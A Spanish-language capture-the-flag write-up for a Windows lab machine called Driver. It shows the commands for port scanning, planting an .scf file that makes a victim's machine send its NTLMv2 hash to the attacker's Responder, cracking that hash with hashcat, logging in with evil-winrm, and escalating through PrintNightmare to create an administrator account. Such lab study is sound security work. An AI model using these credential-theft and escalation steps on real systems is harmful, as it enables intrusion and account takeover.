---
title: Driver
published: true
categories: [Windows, Easy]
tags: [Windows explotation, .sfc Phising, PrintNightmare]

image:
  path: https://user-images.githubusercontent.com/55555187/155760252-df3e53d5-df4a-4fcf-b857-12f238c85a03.PNG
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

Driver es una <font color="#98E256">máquina Easy</font> de temática <font color="#2874A6">Windows</font> que toca reconocimiento de un servicio web, explotación de un archivo .scf para obtener hashes NTLMv2, explotación de PrintNightmare.

## Reconocimiento

### Nmap

Una vez que la máquina está activa empezamos la fase de reconocimiento de puertos con nmap.

Identificamos los puertos abiertos de la máquina.

```
nmap -p- --open -sS --min-rate 10000 -Pn -n -vvv 10.10.11.106 -oN portScan
```

Obteniendo:

![recon0](https://user-images.githubusercontent.com/55555187/155534516-2f5d8164-e5f0-4d02-9ec6-6a47c53fd2cd.PNG)

Identificamos la versión y el servicio corriendo en los puertos reportados en el escaneo anterior.

```
nmap -sVC -p80,135,445,5985 10.10.11.106 -oN portSV 
```

Obteniendo:

![recon2](https://user-images.githubusercontent.com/55555187/155534527-271fc95d-ae46-47c1-b3a4-55476942d2c3.PNG)

El puerto 80 reporta un estado 401 unauthorized por lo que a priori no nos estaría dejando acceder.

El puerto 135 se utiliza para manejar remotamente servicios como servidores DHCP o servidores DNS.

El puerto 445 corresponde con el protocolo SMB. SMB es un protocolo cliente/servidor que proporciona acceso a archivos y directorios compartidos.

El puerto 5985 permite realizar comunicación remota por PowerShell a la máquina.



### Reconocimiento del puerto 80

Al acceder al puerto 80 nos encontramos el siguiente panel de autenticación:

![recon1](https://user-images.githubusercontent.com/55555187/155534519-1d3f712f-34c7-4246-aa6f-5723dfeb335b.PNG)

Pruebo con las credenciales **admin:admin** y obtengo acceso a la siguiente web:

![recon4](https://user-images.githubusercontent.com/55555187/155536979-3920ea13-09a8-4cd2-bc88-cf67f504c263.PNG)

Investigando un poco la web podemos ver que tenemos una potencial vía de subir archivos:

![recon5](https://user-images.githubusercontent.com/55555187/155537175-af88708a-57b5-4783-8a0a-e4f96fa4ae1b.PNG)

Otra cosa que me llama la atención de esa vista es que en el mensaje pone que el firmware es subido al fichero compartido y será revisado por un miembro del equipo de pruebas.

Esto me hace pensar varias cosas:

- Cuando subo un archivo a la web, esta lo envía al directorio de SMB.

- Quizás tengamos que acceder a los archivos compartidos en SMB de alguna manera para abrir el fichero y otorgarnos una reverse shell.

- Quizás tenemos que aprovecharnos de que en teoría un miembro del equipo va a abrir el fichero.

Pruebo a subir una reverse shell pero no obtengo nada como era de esperar por lo que me pongo a investigar posibles vías de explotar esta posible vía de entrada.

## Obtención de acceso

Tras investigar durante un tiempo encuentro el siguiente articulo: [hackinarticles](https://www.hackingarticles.in/multiple-files-to-capture-ntlm-hashes-ntlm-theft/) donde se explica cómo obtener el hash **NTLMv2** a través de la inyección de comandos en un fichero.

Para poder llevar a cabo este exploit necesitamos:

- Una potencial vía de enviar el archivo.

- Que el archivo sea abierto por un usuario.

Por lo que parece prometedor ya que cumplimos ambas condiciones.

1- Me descargo el archivo ntlm_theft.py del repositorio [NTLM Theft](https://github.com/Greenwolf/ntlm_theft) y creo un archivo de tipo **.scf** (scf es la extensión para Windows Explore Command).

```
python3 ntlm_theft.py -g scf -s 10.10.16.37 -f test
```

![recon8](https://user-images.githubusercontent.com/55555187/155547317-4e959524-c5b4-43e8-a109-c08559d0a6b5.PNG)

2- En una terminal inicio un **responder** (un responder es un conjunto de servidores desplegados y a la espera de recibir peticiones) sobre la interfaz tun0 (la interfaz de la vpn).

```
responder -I tun0
```

<img src="https://user-images.githubusercontent.com/55555187/155548219-b611009e-bca9-4d2c-bb54-cbd4b8156aeb.PNG" title="" alt="recon11" width="437"> 

3- Subo el archivo utilizando el formulario upload de la web.

![recon6](https://user-images.githubusercontent.com/55555187/155547800-383abe90-0e08-4b62-a633-c9c3bb5be2d9.PNG)

Obtengo el **hash NTLMv2** del usuario **tony**:

![recon7](https://user-images.githubusercontent.com/55555187/155547756-a2f38cfd-8b68-4a47-8637-8a2937b62f07.PNG)

### Explicación del ataque

Este ataque es posible gracias al envenenamiento de los protocolos LLMNR y NBT-NS de Windows.

LLMNR y NBT-NS son protocolos utilizados para la resolución de los nombres de los sistemas informáticos cercanos.

Por defecto, Windows a la hora de resolver un nombre de dominio pregunta en este orden:

1- DNS.

2- LLMNR.

3- NBT-NS.

Si no obtiene una respuesta satisfactoria en un nivel, pregunta al siguiente.

Lo crítico es que tanto LLMNR como NBT-NS son **protocolos multicast**, es decir, que si no encuentran el dominio especificado mandan una petición a todos los nodos de la red.

Cuando el responder recibe la petición, este **envenena la respuesta** que dice que el recurso que busca se encuentra en nuestra máquina y que requiere autenticación acceder a este por lo que la máquina víctima nos proporciona su hash NTLMv2.



Una vez que tenemos el hash lo guardamos en el fichero ntlmhash.txt y lo crackeamos utilizando **hashcat** y el diccionario **rockyou**.

```
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

<img src="https://user-images.githubusercontent.com/55555187/155549866-6120579a-b6e1-45b7-9013-3d1a4a0ca287.PNG" title="" alt="recon9" width="486">

![recon10](https://user-images.githubusercontent.com/55555187/155549870-eec17a93-7002-4d84-ad2f-b81608cbf3a6.PNG)

Aprovechando que está el puerto 5985 abierto y la utilidad [evil-winrm](https://github.com/Hackplayers/evil-winrm) me conecto a la máquina víctima.

```
evil-winrm -i 10.10.11.106 -u tony -p 'liltony'
```

<img title="" src="https://user-images.githubusercontent.com/55555187/155754454-7223a9bc-a415-4696-a866-83b277d60b2a.PNG" alt="acc1" data-align="left">

## Escalado de privilegios

A la hora de escalar privilegios lo primero que hago es ejecutar [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) en la máquina.



WinPEAS reporta muchísimas cosas y no veo un vector claro de escalado.

Al rato recuerdo la vulnerabilidad **Printnightmare** y en la temática de la máquina lo que me hace pensar que podría ser viable escalar privilegios así.

Compruebo que el equipo no tenga capado el proceso Print Spooler (por defecto activo en todas las versiones de Windows).

<img src="https://user-images.githubusercontent.com/55555187/155754453-0497cc3f-d940-4c2c-967f-01b7a982af3e.PNG" title="" alt="recon13" width="581">



Posteriormente me informé sobre las posibles vías de explotación de printnightmare encontrando el siguiente post https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/ 



Decidí probar con la segunda vía de utilizar la vulnerabilidad ya que emplea un exploit desarrollado por John Hammond, persona más que competente en el campo.

Esta via consiste en un escalado de privilegios local creando un usuario nuevo e introduciéndolo en el grupo administrators.



### ¿Como funciona el exploit?

<img title="" src="https://user-images.githubusercontent.com/55555187/155754438-c3a683aa-23f8-4bd3-9902-dfd6f0571383.PNG" alt="privesc3" width="680">

![privesc4](https://user-images.githubusercontent.com/55555187/155754445-91302eff-3345-4d32-87ee-a2cf3aec1fe4.PNG)

![privesc5](https://user-images.githubusercontent.com/55555187/155754447-9724d593-ecbe-4c89-9985-9db8aca30ba8.PNG)

**Printnightmare** se aprovecha de un bug de autorización en el proceso Print Spooler que permite que cualquiera pueda instalar drivers de impresora mediante una función llamada RpcAddPrinterDriverEx().

Un atacante puede subir un fichero DLL con código que será ejecutado por el servicio Print Spooler con permisos SYSTEM.



Lo que he realizado en las capturas de arriba es lo siguiente:

1- Me descargo el archivo .ps1 malicioso.

2- Lo traslado a la máquina víctima.

3- Importo el archivo en la sesión actual mediante Import-Module.

4- Lanzo el exploit.



El exploit lo que hace es crear el archivo DLL malicioso que inyecta código para que el proceso Print Spooler ejecute como SYSTEM la creación del usuario kripteria con contraseña kripteria y lo meta en el grupo administrators.



Durante la ejecución del exploit, al importar el archivo .ps1 recibí un error debido a que la powershell se encontraba en modo restringido.

Probé varias formas de desbloquear la powershell hasta que al final dí con un método válido.



![privesc6](https://user-images.githubusercontent.com/55555187/155754449-218f4229-cfd8-4f89-a9ec-f7ff8e1b50b0.PNG)

Con el usuario kripteria creado, nos logueamos a él con evil-winrm y obtenemos acceso como administrator.
